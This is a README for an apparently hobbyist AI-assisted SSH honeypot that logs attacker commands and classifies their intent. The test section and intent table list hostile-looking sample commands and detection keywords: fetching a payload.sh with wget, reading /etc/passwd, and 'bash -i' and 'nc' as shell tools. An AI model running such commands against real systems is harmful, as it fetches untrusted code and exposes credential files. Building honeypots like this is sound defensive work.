# 🐝 BeeHive — AI-Powered SSH Honeypot

BeeHive is a **defensive cybersecurity tool** that pretends to be a real Linux server. When attackers connect via SSH and start poking around, BeeHive lets them in, watches everything they do, uses **Google Gemini AI** to generate convincing fake files to keep them engaged, and logs all their activity to a dashboard so you can study their behaviour.

> **Think of it like a fake bank vault** — it looks real enough to lure a burglar in, but there's nothing actually valuable inside. Meanwhile, you're watching through a camera the whole time.

---

## How It Works

```
Attacker connects via SSH (port 2222)
        ↓
BeeHive fakes a real Ubuntu server shell
        ↓
Every command is classified (Reconnaissance / Exfiltration / Persistence / Exploitation)
        ↓
Gemini AI generates believable fake files in response
        ↓
Everything is logged to a local SQLite database
        ↓
You view attacker behaviour on the Flask dashboard (port 5000)
```

---

## Project Structure

```
BeeHive-main/
├── server.py          # The fake SSH server — entry point
├── gemini_engine.py   # AI that generates fake files per session
├── classifier.py      # Detects attacker intent from commands
├── logger.py          # Saves all events to SQLite database
├── dashboard.py       # Flask web dashboard to view logs
├── templates/
│   └── index.html     # Dashboard UI
├── host_key           # SSH host key (pre-generated)
├── host_key.pub       # Public key
├── test.py            # Quick test for the logger
└── test_log.py        # Test that seeds fake log events
```

---

## Prerequisites

Make sure you have the following installed:

- **Python 3.8+**
- **pip** (Python package manager)
- A **Google Gemini API key** (free tier available at [aistudio.google.com](https://aistudio.google.com))

---

## Installation

### 1. Clone or download the project

```bash
git clone https://github.com/your-username/BeeHive.git
cd BeeHive-main
```

### 2. Create a virtual environment (recommended)

```bash
python -m venv venv
source venv/bin/activate        # On Windows: venv\Scripts\activate
```

> A virtual environment keeps your project's packages separate from the rest of your system — good practice for any Python project.

### 3. Install dependencies

```bash
pip install paramiko flask google-genai python-dotenv
```

| Package | What it does |
|---|---|
| `paramiko` | Handles the SSH connection protocol |
| `flask` | Powers the web dashboard |
| `google-genai` | Calls the Gemini AI API |
| `python-dotenv` | Loads your API key from a `.env` file |

### 4. Set up your Gemini API key

Create a file called `.env` in the project root:

```
GEMINI_API_KEY=your_api_key_here
```

> The `.env` file is already in `.gitignore` so it won't be accidentally pushed to GitHub — never commit API keys!

---

## Running BeeHive

You need **two terminals** running simultaneously.

### Terminal 1 — Start the SSH Honeypot

```bash
python server.py
```

You should see:
```
[+] Honeypot SSH server running on port 2222
```

> This starts a fake SSH server on port 2222. Port 22 is the real SSH port — using 2222 avoids conflicts and doesn't require admin/root privileges.

### Terminal 2 — Start the Dashboard

```bash
python dashboard.py
```

Then open your browser at: **http://localhost:5000**

---

## Testing It Yourself

Open a **third terminal** and connect to your own honeypot:

```bash
ssh -p 2222 ubuntu@localhost
```

Accept the host key fingerprint when prompted. You'll see a fake Ubuntu welcome message. Try these commands to see BeeHive respond:

```bash
whoami        # Returns: ubuntu
id            # Returns fake user/group info
ls            # Lists AI-generated fake files
uname -a      # Returns fake kernel info
cat /etc/passwd  # Returns fake system users
wget http://example.com/payload.sh  # Triggers exfiltration detection
sudo su       # Triggers exploitation detection
```

Each command you type is classified and logged. Refresh the dashboard at **http://localhost:5000** to see the activity in real time.

---

## Understanding the Dashboard

The dashboard shows:

- **Recent Events** — every command run, by whom, and when
- **Intent Counts** — breakdown of attack categories detected
- **Top Commands** — most frequently run commands
- **Attacker Profile** — automatic classification of the attacker's skill level

### Attack Intent Categories

| Intent | Example Commands | What it means |
|---|---|---|
| Reconnaissance | `whoami`, `ls`, `uname` | Attacker is mapping out the system |
| Exfiltration | `wget`, `curl`, `cat /etc/passwd` | Attacker is trying to steal data |
| Persistence | `chmod +x`, `crontab` | Attacker is trying to stay on the system |
| Exploitation | `sudo`, `bash -i`, `nc` | Attacker is trying to escalate privileges |

---

## Running the Tests

To quickly seed the database with fake events and verify everything works:

```bash
python test_log.py
```

To view what's currently in the database:

```bash
python test.py
```

---

## Security Notes

- BeeHive is designed to run in a **controlled environment** (local machine, VM, or sandboxed cloud instance).
- **Do not expose port 2222 to the public internet** unless you know what you're doing — while BeeHive is a honeypot, an exposed port still has some risk.
- All generated files and credentials are **intentionally fake** — the Gemini prompt explicitly forbids real secrets or malware.
- The `host_key` file is pre-generated and included in the repo. For any real deployment, regenerate it:

```bash
ssh-keygen -t rsa -b 2048 -f host_key -N ""
```

---

## Architecture Overview

```
                    ┌─────────────┐
  Attacker SSH ────▶│  server.py  │
                    └──────┬──────┘
                           │ command
              ┌────────────┼────────────┐
              ▼            ▼            ▼
       classifier.py  logger.py  gemini_engine.py
       (labels intent) (saves to DB)  (generates fake files)
                            │
                            ▼
                       db.sqlite3
                            │
                            ▼
                      dashboard.py ──▶ Browser UI
```

---

## Troubleshooting

**`ModuleNotFoundError`** — Run `pip install <missing-package>` inside your virtual environment.

**`Permission denied` on port 2222** — Make sure no other process is using port 2222: `lsof -i :2222`

**Gemini API errors** — Check your `.env` file has the correct key, or verify your quota at [aistudio.google.com](https://aistudio.google.com).

**Dashboard shows no data** — Make sure you've connected to the honeypot at least once, or run `python test_log.py` to seed test data.

---

## License

MIT — feel free to use, modify, and learn from this project.
